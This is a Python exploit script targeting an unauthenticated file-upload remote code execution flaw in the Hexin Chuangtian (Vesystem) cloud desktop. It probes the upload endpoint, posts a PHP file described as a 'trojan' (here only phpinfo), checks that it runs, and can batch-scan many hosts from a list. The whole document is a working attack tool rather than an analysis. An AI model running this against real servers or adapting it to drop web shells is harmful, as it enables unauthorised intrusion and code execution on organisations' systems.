#!/usr/bin/env python
# -*- conding:utf-8 -*-

import requests
import argparse
import sys
import urllib3
urllib3.disable_warnings()

def title():
    print("""
                                  和信创天云桌面 远程命令执行漏洞 
                                  use: python3 VesystemRCE.py
                                      Author: Henry4E36
               """)

class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        target_url = self.url + "/Upload/upload_file.php?l=test"
        rce_url = self.url + "/Upload/test/1.php"

        headers_test = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryfcKRltGv"
        }

        data ="""
------WebKitFormBoundaryfcKRltGv
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/avif

<?php
phpinfo();
?>
------WebKitFormBoundaryfcKRltGv--

        """
        try:
            res = requests.get(url=target_url,headers=headers_test,verify=False,timeout=5)
            if "_Requst:" in res.text and res.status_code == 200:
                print(f"\033[31m[{chr(8730)}]  目标系统: {self.url} 存在远程命令执行！")
                print("[#]  正在上传木马文件")
                try:
                    upload_res = requests.post(url=target_url,headers=headers,data=data,verify=False,timeout=5)
                    rce_res = requests.get(url=rce_url,headers=headers,verify=False,timeout=5)
                    if "PHP License" in rce_res.text and rce_res.status_code == 200:
                        print(f"\033[31m[{chr(8730)}]  木马文件上传成功，请访问: {self.url}/Upload/test/1.php\033[0m")
                        print("\n")
                    else:
                        print("[\033[31mX\033[0m]  木马文件上传失败！")
                        print("\n")
                except Exception as e:
                    print("[\033[31mX\033[0m]  上传错误！")
                    print("\n")

            else:
                print(f"[\033[31mx\033[0m]  目标系统: {self.url} 不存在远程命令执行！")
                print("\n")
        except Exception as e:
            print("[\033[31mX\033[0m]  连接错误！")
            print("\n")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)





if __name__ == "__main__":
    title()
    parser = ar=argparse.ArgumentParser(description='和信创天云桌面 远程命令执行漏洞')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 VesystemRCE.py -u http://127.0.0.1\neg2:>>>python3 VesystemRCE.py -f ip.txt")
    elif args.url:
        information(args).target_url()

    elif args.file:
        information(args).file_url()

